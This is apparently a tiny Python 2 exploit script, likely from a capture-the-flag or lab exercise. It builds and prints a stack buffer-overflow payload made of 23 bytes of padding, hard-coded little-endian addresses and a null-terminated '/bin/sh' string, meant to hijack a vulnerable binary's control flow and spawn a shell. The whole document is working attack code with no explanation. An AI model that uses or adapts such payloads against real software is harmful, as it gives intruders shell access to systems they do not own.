#!/usr/bin/env python2

import struct

exp = 'A'*23
exp += struct.pack("<L", 0xffffdb18)
exp += struct.pack("<L", 0x080486c3)
exp += struct.pack("<L", 0xffffdb24)
exp += "/bin/sh\x00"

print exp
